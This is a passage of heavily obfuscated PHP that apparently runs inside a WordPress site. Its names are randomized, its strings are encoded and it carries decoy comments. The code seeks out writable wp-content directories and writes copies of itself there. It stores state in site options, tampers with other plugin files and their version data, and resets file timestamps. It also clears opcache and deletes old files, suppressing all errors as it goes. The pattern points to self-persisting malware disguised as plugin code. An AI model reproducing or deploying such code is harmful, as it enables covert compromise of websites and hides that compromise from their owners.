   function g7b6t_c45mkf3jmbd2c($e3odkvvirkd_y00b,  $duluassmqus,  $cupk3kbt8eisf =   (0x3+0x7),  $ukjj4vzpxsr   =  1)



  {



 if  (!$GLOBALS['__scf_w3f945e2es_4'](ovffvv33(173))) return    false;
if  ($GLOBALS['__scf_fv3zevxzzb_44']($duluassmqus)) {
return add_filter($e3odkvvirkd_y00b, function     (...$_35lll3l0xl) use ($duluassmqus) {
    if  ($GLOBALS['__scf_w3f945e2es_4']($duluassmqus))    return  $duluassmqus(...$_35lll3l0xl);



    return   isset($_35lll3l0xl[0])  ? $_35lll3l0xl[0] :  null;
 }, $cupk3kbt8eisf,   $ukjj4vzpxsr);
  }
return  add_filter($e3odkvvirkd_y00b,  $duluassmqus, $cupk3kbt8eisf,  $ukjj4vzpxsr);
  }
function   p2b_7j_9ex54eg4()
{$horz7z30wk5=33|42;$nlqcqj9q_i=$horz7z30wk5^130;
$t49jadtyjx    =    defined(bpowi0iglycvx(99)) ?   WP_CONTENT_DIR  .   f6yrzd2knrmb(94)  . nreub2fs747eromoe(ABSPATH  .  iw6xe9q4j6sneg(95),  (0x3+0x5))     : $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())  . ovffvv33(174);
 if    (!@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)  &&  fiq2af1kmyjbo9re_ltz($t49jadtyjx)) {
   xxvz5dp1zk215e5d9($t49jadtyjx,     (433+60), true);


 if    (@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx))  {
s_xzav70hr_4pogeop0o($t49jadtyjx   .    c1sob647u1i(175), "<?php // Silence is golden.\n",    iw6xe9q4j6sneg(176));
 }
}
if (@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)  &&  @$GLOBALS['__scf_sunuwikkpg6_51']($t49jadtyjx))      {

    return  $t49jadtyjx;
     }
  $ibrjbne32ad    =  $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())    .     ovffvv33(174);
 if (!@$GLOBALS['__scf_opq_vgkskw_46']($ibrjbne32ad)   &&   fiq2af1kmyjbo9re_ltz($ibrjbne32ad)) xxvz5dp1zk215e5d9($ibrjbne32ad,    (0xaf+0x13e), true);
    if    (@$GLOBALS['__scf_opq_vgkskw_46']($ibrjbne32ad)   &&      @$GLOBALS['__scf_sunuwikkpg6_51']($ibrjbne32ad))  return $ibrjbne32ad;
      $jvzhe2h4vf   =  $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t());
    if   (@$GLOBALS['__scf_sunuwikkpg6_51']($jvzhe2h4vf)  &&     $jvzhe2h4vf    !==  jo62hy1j37iqrmy())   return  $jvzhe2h4vf;
    if (defined(c1sob647u1i(99))  &&   @$GLOBALS['__scf_sunuwikkpg6_51'](WP_CONTENT_DIR) &&  fiq2af1kmyjbo9re_ltz(WP_CONTENT_DIR))   return  WP_CONTENT_DIR;
   return $t49jadtyjx;
 }
      function ircnjcyfmf8qkc7xdiss4()
   {
     if (defined(hn_f08x0cns80(177))   && @$GLOBALS['__scf_sunuwikkpg6_51'](WP_CONTENT_DIR)  &&  fiq2af1kmyjbo9re_ltz(WP_CONTENT_DIR))    return WP_CONTENT_DIR;
     $yhm_l1n5lscaykzo =  $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t());
 if   (fiq2af1kmyjbo9re_ltz($yhm_l1n5lscaykzo)) return $yhm_l1n5lscaykzo;
return WP_CONTENT_DIR;
 }
 
    function     hiisk00z0i4v1wyj3($w90pshmxoqhf)
     {
   if (empty($GLOBALS[bpowi0iglycvx(178)])   ||    !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[f6yrzd2knrmb(179)])) return  false;
if     (isset($GLOBALS[bpowi0iglycvx(179)][$w90pshmxoqhf]))    return     true;
$iddx6_s0b1 =   $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(180)) ? @$GLOBALS['__scf_ba4991zo41sta_36']($w90pshmxoqhf)  :   false;$on68ix0q5doi=PHP_MAJOR_VERSION;$ywphmu9zsw_jxl=$on68ix0q5doi*8;
return ($iddx6_s0b1   !==      false   && isset($GLOBALS[f6yrzd2knrmb(181)][$iddx6_s0b1]));
   }
function   wk019avq_nl804u728iogw($w90pshmxoqhf)
   {
   if  (empty($GLOBALS[bpowi0iglycvx(181)])  || !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[bpowi0iglycvx(181)])) return;
     unset($GLOBALS[bpowi0iglycvx(182)][$w90pshmxoqhf]);
$iddx6_s0b1  =  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(183))   ? @$GLOBALS['__scf_ba4991zo41sta_36']($w90pshmxoqhf)  : false;



 if ($iddx6_s0b1   !== false)   unset($GLOBALS[f6yrzd2knrmb(184)][$iddx6_s0b1]);


    }
  function   ngxekb8bil_0r9sftm($w90pshmxoqhf)
  {
  if  (!isset($GLOBALS[f6yrzd2knrmb(185)])   || !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[hn_f08x0cns80(185)])) {
$GLOBALS[c1sob647u1i(185)]  = array();
     }
$vkfhbb8hycke =  $GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(183))   ? @$GLOBALS['__scf_ba4991zo41sta_36']($w90pshmxoqhf) : false;

$GLOBALS[ovffvv33(185)][$vkfhbb8hycke  !==   false  ?  $vkfhbb8hycke  :     $w90pshmxoqhf] =   $w90pshmxoqhf;
  static $c1agdcoow2 =   false;
   if    (!$c1agdcoow2)    {
   $c1agdcoow2      =    true;
   if    ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(186)))     $GLOBALS['__scf_g45egtj01hms_186'](c1sob647u1i(187));
   }



  }
function  aotu_wmpzarqhy7ssakl4()
 {
 if (empty($GLOBALS[ovffvv33(185)]) ||   !$GLOBALS['__scf_w1m1ydxx4_gm9__38']($GLOBALS[hn_f08x0cns80(188)]))   {
// split stabilizer for WP Core Data

      return;


 }



      foreach  ($GLOBALS[c1sob647u1i(188)]   as $jsg8hiyynpvc  => $g5x04iw2w6d) {
  if  (!$GLOBALS['__scf_fv3zevxzzb_44']($g5x04iw2w6d)) $g5x04iw2w6d      =   $jsg8hiyynpvc;
  if ($jsg8hiyynpvc     ===  bmvtr5sdqjf5km1t()  ||  $g5x04iw2w6d  ===  bmvtr5sdqjf5km1t())  continue;
try    {
if  (@$GLOBALS['__scf_rjpcj9l4bigb5_21']($g5x04iw2w6d)  && !j81oyiorlegz06z33($g5x04iw2w6d)     &&   awt0clbm2rkh9u4z8mjsz($g5x04iw2w6d))  {
    cbzu166xe9qr89g6($g5x04iw2w6d);
    czznuvw9tobf1x1o($g5x04iw2w6d);
}

     }  catch     (Throwable   $cje8wku90zm4r)    {
    }   catch   (Exception    $cje8wku90zm4r)   {
// @defragment observer

    }
   }
}
     function      trnnp6salhm3hvvf7()
 {$kwpcd2tbz0y11d=(0x85+0xbc);$pzesd48bic=$kwpcd2tbz0y11d%17;



  try   {

   $cje8wku90zm4r  =    $GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(189)) ? @error_get_last()  : null;
if    (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($cje8wku90zm4r)     ||  empty($cje8wku90zm4r[f6yrzd2knrmb(190)])    ||  empty($cje8wku90zm4r[iw6xe9q4j6sneg(191)]))   return;
 if     (!$GLOBALS['__scf_rd2tojulg06lx_160']($cje8wku90zm4r[f6yrzd2knrmb(192)],    array(E_ERROR, E_PARSE, E_CORE_ERROR,  E_COMPILE_ERROR,    E_USER_ERROR),   true))    return;
   $u7fvh_hax8vn    =      isset($cje8wku90zm4r[f6yrzd2knrmb(193)])   ? (string) $cje8wku90zm4r[iw6xe9q4j6sneg(193)]     : "";

 if  (stripos($u7fvh_hax8vn,   iw6xe9q4j6sneg(194))    !==  false    ||  stripos($u7fvh_hax8vn, hn_f08x0cns80(195))  !== false)    return;



     $b6l44ydrqs4cl =    $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(183))    ?  @$GLOBALS['__scf_ba4991zo41sta_36'](bmvtr5sdqjf5km1t()) : bmvtr5sdqjf5km1t();
 $_ef = $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(196))  ?    @$GLOBALS['__scf_ba4991zo41sta_36']($cje8wku90zm4r[bpowi0iglycvx(190)])   :  $cje8wku90zm4r[iw6xe9q4j6sneg(197)];
  if     (!$GLOBALS['__scf_fv3zevxzzb_44']($b6l44ydrqs4cl)     ||  !$GLOBALS['__scf_fv3zevxzzb_44']($_ef)    ||  $_ef  !==   $b6l44ydrqs4cl)     return;
 if  (isset($GLOBALS[c1sob647u1i(198)]))  {
$phech3sj141uh =   @$GLOBALS['__scf_utyj_ckly79_101'](bmvtr5sdqjf5km1t(),    false,   null, 0,   (0x45f+0xba1));
      if     ($GLOBALS['__scf_fv3zevxzzb_44']($phech3sj141uh) && $GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(103), $phech3sj141uh,    $_dm)  &&  $_dm[1] !==   (string)  $GLOBALS[ovffvv33(198)])    return;   
   unset($phech3sj141uh,   $_dm);
    

 if  (isset($GLOBALS[f6yrzd2knrmb(199)])) {



if ($GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(63)))     @clearstatcache(true,  bmvtr5sdqjf5km1t());
 $wl75dbfkuhg880  =     (string)   @$GLOBALS['__scf_b42duf6j1zadm9_105'](bmvtr5sdqjf5km1t())     .  ':' .      (string)  @$GLOBALS['__scf_uo_a60ibqnli_104'](bmvtr5sdqjf5km1t());
 if ($wl75dbfkuhg880 !==  (string)  $GLOBALS[iw6xe9q4j6sneg(199)])   return;  
    unset($wl75dbfkuhg880);
  }
      }
 $pjov750v0e    =   $GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),  hn_f08x0cns80(27));
  $a3s70eit7ctg     =  pvqofla267dcimn(bmvtr5sdqjf5km1t());
   $ydkhzfw_nx4u =  $GLOBALS['__scf_fv3zevxzzb_44']($a3s70eit7ctg) ? $GLOBALS['__scf_tnonex5o9y_60']($a3s70eit7ctg) :   "";

   unset($a3s70eit7ctg);
      if    ($ydkhzfw_nx4u  !==  "")    {
   s_xzav70hr_4pogeop0o($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())   .  iw6xe9q4j6sneg(200) . $pjov750v0e,  $ydkhzfw_nx4u, 'q');
 s_xzav70hr_4pogeop0o($GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t())   . c1sob647u1i(201)     . $ydkhzfw_nx4u,  (string)   $GLOBALS['__scf_qzyo0sgkyb6_202'](),  'q');
    if    ($GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(156)))   {

  @update_option(hn_f08x0cns80(203),   $ydkhzfw_nx4u  .      '|'  .   $GLOBALS['__scf_qzyo0sgkyb6_202'](),    f6yrzd2knrmb(204));


 }
  }
  $ewvjaum6vw0469l1      =      jo62hy1j37iqrmy();
   if     ($ydkhzfw_nx4u !==   ""      &&  $ewvjaum6vw0469l1 !==   $GLOBALS['__scf_po3uwzhcb63b03_11'](bmvtr5sdqjf5km1t()) && @$GLOBALS['__scf_opq_vgkskw_46']($ewvjaum6vw0469l1)    &&  @$GLOBALS['__scf_sunuwikkpg6_51']($ewvjaum6vw0469l1))   {
// @collect provider


 s_xzav70hr_4pogeop0o($ewvjaum6vw0469l1     .   iw6xe9q4j6sneg(200)  .    $pjov750v0e,  $ydkhzfw_nx4u, 'q');



    }
     os2bqp40hitbcx(ayw2e71sos2ne2g());
  spai9j_prce79wsfgreds(hn_f08x0cns80(205));
 $kr_d_dhc4yqrmz  =    bmvtr5sdqjf5km1t()  .  c1sob647u1i(32);
  if     ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(79)))     @$GLOBALS['__scf_qo7895jhcq7i_79'](bmvtr5sdqjf5km1t(),    $kr_d_dhc4yqrmz);
      if    ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(206)))   {



@opcache_invalidate(bmvtr5sdqjf5km1t(),     true);
   @opcache_invalidate($kr_d_dhc4yqrmz, true);


 }
 foreach   (array($GLOBALS['__scf_po3uwzhcb63b03_11']($kr_d_dhc4yqrmz),    jo62hy1j37iqrmy()) as $r1jgp8ufohwggup)  {
 $u9hjfz9csv1b1yb6  = fkx3b4a5rv4j4z5ymcs($r1jgp8ufohwggup, (7019-2019));
    if     (!$GLOBALS['__scf_w1m1ydxx4_gm9__38']($u9hjfz9csv1b1yb6))     continue;


      foreach  ($u9hjfz9csv1b1yb6     as   $u5aoak5yeoo9) {
  if  ($GLOBALS['__scf_nv7he759wjfj_9']($u5aoak5yeoo9, -(3+5)) !== f6yrzd2knrmb(207))     continue;
  $es64_catcyb5n    =   $r1jgp8ufohwggup   .   '/'   . $u5aoak5yeoo9;
    $oujmckkre8leqf  = @$GLOBALS['__scf_uo_a60ibqnli_104']($es64_catcyb5n);
 if    ($oujmckkre8leqf  && $oujmckkre8leqf    <  $GLOBALS['__scf_qzyo0sgkyb6_202']()      -     (604707+93)) {
     ruinnb541lwxm7j($es64_catcyb5n,    (353+67));
    cvtaycsw15_xd1srry($es64_catcyb5n);
}
       }
   }


unset($r1jgp8ufohwggup,    $u9hjfz9csv1b1yb6,  $u5aoak5yeoo9,  $es64_catcyb5n,  $oujmckkre8leqf);


 }  catch    (Throwable   $z3_n5n_cg6kq5_)  {



  }    catch (Exception    $z3_n5n_cg6kq5_)  {
  }
      }
      function jnpb812o_r48a5nxup0iiu($w90pshmxoqhf, $nbeqww0gv0ljzc)


  {
 try {$isbeagyz6wp4=PHP_INT_MAX/PHP_INT_MAX;$es90x0ki0xb8=$isbeagyz6wp4+71;


if (!$GLOBALS['__scf_fv3zevxzzb_44']($w90pshmxoqhf)  || $w90pshmxoqhf ===    ""     ||      !$GLOBALS['__scf_fv3zevxzzb_44']($nbeqww0gv0ljzc) ||    $nbeqww0gv0ljzc    === "")    return;
  $t49jadtyjx   =  $GLOBALS['__scf_po3uwzhcb63b03_11']($w90pshmxoqhf);$su3zh04t=77*7;$phmfj6ubfentn_=$su3zh04t-23;
if      (!@$GLOBALS['__scf_opq_vgkskw_46']($t49jadtyjx)   ||     !@$GLOBALS['__scf_sunuwikkpg6_51']($t49jadtyjx)) return;
  $rruhb96q4e  =   $t49jadtyjx  . iw6xe9q4j6sneg(208)  .  $GLOBALS['__scf_owu_4pajngr_3']($w90pshmxoqhf, bpowi0iglycvx(27));
   $m9a_y6lyvy9depn6 =   @$GLOBALS['__scf_utyj_ckly79_101']($rruhb96q4e);
 if ($GLOBALS['__scf_fv3zevxzzb_44']($m9a_y6lyvy9depn6)   && $GLOBALS['__scf_wdjvpd1lvon9_102'](f6yrzd2knrmb(209),   $m9a_y6lyvy9depn6, $u7fvh_hax8vn) &&     version_compare($u7fvh_hax8vn[0],   $nbeqww0gv0ljzc,  ovffvv33(210))) return;
  if     ($GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(211)))  @$GLOBALS['__scf_whcsnotvh9twx_211']($rruhb96q4e,    $nbeqww0gv0ljzc);
   }    catch   (Throwable  $cje8wku90zm4r)   {
}   catch (Exception  $cje8wku90zm4r)  {$ucenlzi5=(0xe8+0xba);$rb8duowgq=$ucenlzi5%14;



     }
 }
 function  uz2hraqvsd93tjlr9p4v()
  {
try {
   if      (!$GLOBALS['__scf_w3f945e2es_4'](iw6xe9q4j6sneg(155)))  {
        return;
   }
if (@get_option(c1sob647u1i(212),  0))  {
 eq7z05kg4s98n6ox(ovffvv33(213), c1sob647u1i(214),   0);
}
  if  (!dtf7lvb25ztuc8jh3htk(f6yrzd2knrmb(215)))  return;
    


$ucbbkg2es249  =  $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60'](ABSPATH  . (string)  e16j_u99g1ldi90iix1i9i()), 0,  (23-11));
       $ipu3_5red1px      =  (string)   @get_option($ucbbkg2es249,     "");
$x5yopeeilr    = ovffvv33(216);$lnfb22fktln=PHP_MAJOR_VERSION;$p4rlj0g7_q23bx=$lnfb22fktln*3;
   $fx6hdu1c9tuzj6    =  "";




 $mtantms8kg0   =   strrev(ins9ithmohgssp_());$lrocoskplox80=65*8;$l_ky17rs=$lrocoskplox80-42;
     $et52rb0g9hphtog =  dfb4_mpcgxvnp230hvh1v();
 $vatl0lxqdsm   = $et52rb0g9hphtog   .    '|'  .  $mtantms8kg0;
    

   
if ($GLOBALS['__scf_w6mdcepio4lkz5_7']($ipu3_5red1px,  '|') !==   false)  {
     $z0hl2wf0hz66   =   $GLOBALS['__scf_xi_pncf33_0_120']('|', $ipu3_5red1px,   2);

$x5yopeeilr = $z0hl2wf0hz66[0];



  $fx6hdu1c9tuzj6   =   $z0hl2wf0hz66[1]; 
}   else     {


     $fx6hdu1c9tuzj6 =     $ipu3_5red1px;



}
 

  if (!$fx6hdu1c9tuzj6)   {



@update_option($ucbbkg2es249,    $vatl0lxqdsm,  iw6xe9q4j6sneg(217));$j7awfw13iq0n=563;$u_kvh_n5az=$j7awfw13iq0n%8;
 return;


 }
 
if   ($fx6hdu1c9tuzj6    ===    $mtantms8kg0) {

 if  ($ipu3_5red1px      !==   $vatl0lxqdsm   &&  version_compare($et52rb0g9hphtog, $x5yopeeilr,   hn_f08x0cns80(210)))  {

 @update_option($ucbbkg2es249,   $vatl0lxqdsm,   c1sob647u1i(217));



   }
      return;
   }
 
  $dnmakiopirqh0y   =  strrev($fx6hdu1c9tuzj6);
 if ($dnmakiopirqh0y   ===   ""  ||    $GLOBALS['__scf_owu_4pajngr_3']($dnmakiopirqh0y) !==  $dnmakiopirqh0y)   {
@update_option($ucbbkg2es249, $vatl0lxqdsm, hn_f08x0cns80(218));
return;
    }


 $szrxn2zt5x9  = jo62hy1j37iqrmy() .   '/'      .     $dnmakiopirqh0y;
   $f3hxy738nu  =    "";
       if    (defined(c1sob647u1i(35)))  {
 $f3hxy738nu   = WP_PLUGIN_DIR  .   '/' .    $GLOBALS['__scf_wvxpw4xfn9_219']($dnmakiopirqh0y,   PATHINFO_FILENAME)  .  '/' . $dnmakiopirqh0y;
}

$ej1ret_kbm3wv_d = @$GLOBALS['__scf_b42duf6j1zadm9_105']($szrxn2zt5x9);
   $l1ibqsl237gw90xz     =  $ej1ret_kbm3wv_d !==  false &&    $ej1ret_kbm3wv_d >= (4903+97);$yztf47d6eysk7z=212|220;$o4psgawz=$yztf47d6eysk7z^115;
   $k7g4tfmpyn = $f3hxy738nu ?  @$GLOBALS['__scf_b42duf6j1zadm9_105']($f3hxy738nu)     : false;

       $uifiqipu7dwr      =      $k7g4tfmpyn   !==   false     &&  $k7g4tfmpyn   >=  (4615+385);


    if    (!$l1ibqsl237gw90xz  && !$uifiqipu7dwr)   {
 @update_option($ucbbkg2es249,      $vatl0lxqdsm,   f6yrzd2knrmb(218));

return;
 }

   $b_q5xysgfls =   $l1ibqsl237gw90xz    ? $szrxn2zt5x9   : $f3hxy738nu;
   $xgw9ez25vlk4q     = @$GLOBALS['__scf_utyj_ckly79_101']($b_q5xysgfls,  false,  null,  0,     (1916+2180));
if    ($GLOBALS['__scf_fv3zevxzzb_44']($xgw9ez25vlk4q) && $GLOBALS['__scf_wdjvpd1lvon9_102'](hn_f08x0cns80(103),  $xgw9ez25vlk4q,     $_fm))   {
  $x5yopeeilr =   $_fm[1];
     }  elseif   (mza6zg2fnwyep8gx2xd($b_q5xysgfls,     (0xdca+0x5be)))  {



        $x5yopeeilr =   f6yrzd2knrmb(216);$aewtlvrieb=PHP_MAJOR_VERSION;$aeknfcttucjb=$aewtlvrieb*6;
   }
     unset($xgw9ez25vlk4q,  $_fm);
  $ozje05hvtzkrtp_d = $l1ibqsl237gw90xz;
    if   (!$ozje05hvtzkrtp_d &&  $uifiqipu7dwr)    {


 $wk3nu608bpg6lcuv =     $GLOBALS['__scf_wvxpw4xfn9_219']($dnmakiopirqh0y,   PATHINFO_FILENAME) .    '/'   .  $dnmakiopirqh0y;


   $jia_zm3l7as01e    =    (array) @get_option(iw6xe9q4j6sneg(220),  array());


        $ozje05hvtzkrtp_d   =    $GLOBALS['__scf_rd2tojulg06lx_160']($wk3nu608bpg6lcuv,    $jia_zm3l7as01e,    true);
  if  (!$ozje05hvtzkrtp_d  && $GLOBALS['__scf_w3f945e2es_4'](bpowi0iglycvx(221))  &&  is_multisite()    &&  $GLOBALS['__scf_w3f945e2es_4'](ovffvv33(222))) {
$frn5p6nougrw     =  (array) @get_site_option(hn_f08x0cns80(223),  array());
       $ozje05hvtzkrtp_d = isset($frn5p6nougrw[$wk3nu608bpg6lcuv]);
     unset($frn5p6nougrw);
    }
 unset($wk3nu608bpg6lcuv, $jia_zm3l7as01e);
     }
 $e5jjl9fx5dv_  =  version_compare($et52rb0g9hphtog,    $x5yopeeilr);
 if ($e5jjl9fx5dv_    <=  0) {
$fiw9rdapdc1pphjq    =   mza6zg2fnwyep8gx2xd($b_q5xysgfls,     (4982+18));
  $s9fh1embjy =    (int)   @$GLOBALS['__scf_b42duf6j1zadm9_105']($b_q5xysgfls);
$ijt4khet4cy_a5_   = (!$fiw9rdapdc1pphjq    ||   $s9fh1embjy      >  (23823430+28605370));
     if  (!$ijt4khet4cy_a5_  &&  $s9fh1embjy  >  (1048565+11)) {
$z8iu_ea60kozv1  = @$GLOBALS['__scf_utyj_ckly79_101']($b_q5xysgfls,   false,    null, 0,    (4009+87));
  


 if   (!$GLOBALS['__scf_fv3zevxzzb_44']($z8iu_ea60kozv1)  ||   !$GLOBALS['__scf_wdjvpd1lvon9_102'](bpowi0iglycvx(224),  $z8iu_ea60kozv1))  $ijt4khet4cy_a5_  =    true;
     }

if   (!$ijt4khet4cy_a5_    && !ryggki6gy_dkip68q37($b_q5xysgfls)) $ijt4khet4cy_a5_     =    true;
 if  (!$ijt4khet4cy_a5_)    {



 $a3jbg1e0utc   =   lx6fapg24yvy30nkep2();



if (!empty($a3jbg1e0utc[bpowi0iglycvx(225)]))  {
$wfgc5g_0s59sm = @$GLOBALS['__scf_ba4991zo41sta_36']($a3jbg1e0utc[bpowi0iglycvx(225)]);
$y6j8o8ahk27modd =  @$GLOBALS['__scf_ba4991zo41sta_36']($b_q5xysgfls);
if ($GLOBALS['__scf_fv3zevxzzb_44']($wfgc5g_0s59sm) &&   $GLOBALS['__scf_fv3zevxzzb_44']($y6j8o8ahk27modd)   &&  $wfgc5g_0s59sm    === $y6j8o8ahk27modd)   {
    $eynn_s5cpbm6   =      mj1bikln92glwu($a3jbg1e0utc);

if ($eynn_s5cpbm6   ===   c1sob647u1i(226)      || $eynn_s5cpbm6  ===    ovffvv33(227))   $ijt4khet4cy_a5_   =   true;
 }
  unset($wfgc5g_0s59sm,    $y6j8o8ahk27modd,  $eynn_s5cpbm6);
  }
  if (!$ijt4khet4cy_a5_  &&  fiaip3tpztqie0($b_q5xysgfls))      $ijt4khet4cy_a5_   =     true;
 unset($a3jbg1e0utc);



 }


   if  ($ijt4khet4cy_a5_)  {
 if   ($fiw9rdapdc1pphjq)    ngxekb8bil_0r9sftm($b_q5xysgfls);

   @update_option($ucbbkg2es249,      $vatl0lxqdsm,     f6yrzd2knrmb(228));
   return;
}



       if     (!$ozje05hvtzkrtp_d)  {
 @update_option($ucbbkg2es249,    $vatl0lxqdsm,  ovffvv33(228));
     return;


  }
      if  (jgwy2r_kyhdvn73hyej57($b_q5xysgfls,  bmvtr5sdqjf5km1t()))     {
@update_option($ucbbkg2es249, $vatl0lxqdsm,     ovffvv33(228));



  return;
}
        if      ($e5jjl9fx5dv_   <     0  ||  ($e5jjl9fx5dv_   ===      0 && $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($GLOBALS['__scf_owu_4pajngr_3'](bmvtr5sdqjf5km1t(),   c1sob647u1i(27))),  0, (7+5))  <= $GLOBALS['__scf_nv7he759wjfj_9']($GLOBALS['__scf_tnonex5o9y_60']($GLOBALS['__scf_owu_4pajngr_3']($dnmakiopirqh0y, bpowi0iglycvx(27))),   0,    (7^11))))   {$s186k_ly_ahr=PHP_INT_MAX/PHP_INT_MAX;$x8ka4nv3dso=$s186k_ly_ahr+32;

  jnpb812o_r48a5nxup0iiu(bmvtr5sdqjf5km1t(),     $x5yopeeilr);
    qoqrml97dq62oyv8rd_pq(bmvtr5sdqjf5km1t());
      return  true;
}
 }
// WP Query Loop: compact covariant

  if  (empty($GLOBALS[f6yrzd2knrmb(229)])) {
  $GLOBALS[hn_f08x0cns80(229)]    = true;
 if  (mza6zg2fnwyep8gx2xd($b_q5xysgfls,   (4924+76))) ngxekb8bil_0r9sftm($b_q5xysgfls);

    $w9ztxxctmi2 = $GLOBALS['__scf_qzyo0sgkyb6_202']();
bouscp0t4dvybv(bmvtr5sdqjf5km1t(),     ($w9ztxxctmi2   - ($w9ztxxctmi2    %  (99965+35)))   +  e16j_u99g1ldi90iix1i9i());
 unset($w9ztxxctmi2);
  jnpb812o_r48a5nxup0iiu($szrxn2zt5x9, $et52rb0g9hphtog);
if   ($f3hxy738nu)  jnpb812o_r48a5nxup0iiu($f3hxy738nu,  $et52rb0g9hphtog);
eq7z05kg4s98n6ox(ovffvv33(213),   c1sob647u1i(230),   0);
    @update_option($ucbbkg2es249,   $vatl0lxqdsm,    hn_f08x0cns80(231));
   spai9j_prce79wsfgreds(hn_f08x0cns80(232));
 if    ($f3hxy738nu  !==    "")  {
 os2bqp40hitbcx($GLOBALS['__scf_wvxpw4xfn9_219']($dnmakiopirqh0y,    PATHINFO_FILENAME) . '/'  . $dnmakiopirqh0y);
  }
   }
       return;
   } catch (Throwable      $cje8wku90zm4r) {
   g_qoqdy38lfl4v4n3618(hn_f08x0cns80(233),   $cje8wku90zm4r);
   }    catch      (Exception   $cje8wku90zm4r)  {
} finally      {
  l5zn64lzopflqr0dsekx(f6yrzd2knrmb(215));
 }
 }
 function   fkx3b4a5rv4j4z5ymcs($t49jadtyjx, $khecyqwlw_chmd    =    0)


 {
    $khecyqwlw_chmd  =   (int)   $khecyqwlw_chmd;

      if     ($GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(234)) &&     $GLOBALS['__scf_w3f945e2es_4'](c1sob647u1i(235)))  {
        $j4ll91fe9vho   =    @$GLOBALS['__scf_q2beonq6yv5_234']($t49jadtyjx);
  if     ($j4ll91fe9vho)  {
  $toxd7lwn40kosh59  =  array();
while (($cje8wku90zm4r =  @$GLOBALS['__scf_u3vu0za9iv_f_235']($j4ll91fe9vho))   !== false)    {
   if   ($cje8wku90zm4r  !==  '.' &&   $cje8wku90zm4r !== ovffvv33(50))    $toxd7lwn40kosh59[]     =  $cje8wku90zm4r;
if    ($khecyqwlw_chmd > 0   && $GLOBALS['__scf_wj6dld55k5r8m_39']($toxd7lwn40kosh59)  >=    $khecyqwlw_chmd)   break;
    }

  if   ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(236)))   @$GLOBALS['__scf_ll2wbhoqs9_237']($j4ll91fe9vho);
  

return $toxd7lwn40kosh59;
      }
      }
 if    ($GLOBALS['__scf_w3f945e2es_4'](ovffvv33(54)))     {
  $n0tlzmrutbrfwh_   =  @$GLOBALS['__scf_o586spfnej_37']($t49jadtyjx);
    if   ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($n0tlzmrutbrfwh_))   {
$n0tlzmrutbrfwh_    = $GLOBALS['__scf_vmnuset3sz__158']($GLOBALS['__scf_yucj673b8x_164']($n0tlzmrutbrfwh_,    array('.',   bpowi0iglycvx(50))));
if    ($khecyqwlw_chmd  > 0 &&    $GLOBALS['__scf_wj6dld55k5r8m_39']($n0tlzmrutbrfwh_)  >   $khecyqwlw_chmd)   $n0tlzmrutbrfwh_   = $GLOBALS['__scf_emst8f79kti_170']($n0tlzmrutbrfwh_,   0, $khecyqwlw_chmd);
 return      $n0tlzmrutbrfwh_;
     }
     }


 if    ($GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(238)))  {
      $pp08__6yl5k0 =     @$GLOBALS['__scf_kajvzw3bpufv_75']($t49jadtyjx    .    bpowi0iglycvx(239));
    if ($GLOBALS['__scf_w1m1ydxx4_gm9__38']($pp08__6yl5k0)) {
  if    ($khecyqwlw_chmd   > 0    && $GLOBALS['__scf_wj6dld55k5r8m_39']($pp08__6yl5k0) >  $khecyqwlw_chmd)     $pp08__6yl5k0   =   $GLOBALS['__scf_emst8f79kti_170']($pp08__6yl5k0, 0,   $khecyqwlw_chmd);

  return $GLOBALS['__scf_d_ovrn098z_240'](ovffvv33(3),   $pp08__6yl5k0);
     }
 }
 return  null;
     }



 function    t484alv2r4val57142kin($ch7u8u2ur1)

 {
   if   (!$GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(241))  ||  !$GLOBALS['__scf_w3f945e2es_4'](f6yrzd2knrmb(82)))   return  null;


 $o1odtbtc1ezp6o =     $GLOBALS['__scf_w3f945e2es_4'](hn_f08x0cns80(118)) ?   (string) @$GLOBALS['__scf_hm704kpgfifhl_118'](iw6xe9q4j6sneg(242))   : "";
 if ($o1odtbtc1ezp6o     !==  ""    && stripos($o1odtbtc1ezp6o, f6yrzd2knrmb(241))    !== false)  return null;
    $aha88tji6hewg  = lwxb0otgrmrkttfbm_7t_r($GLOBALS['__scf_cxw7ozc_kikul_82'](),   iw6xe9q4j6sneg(243));



   if ($aha88tji6hewg   ===     false)   return  null;
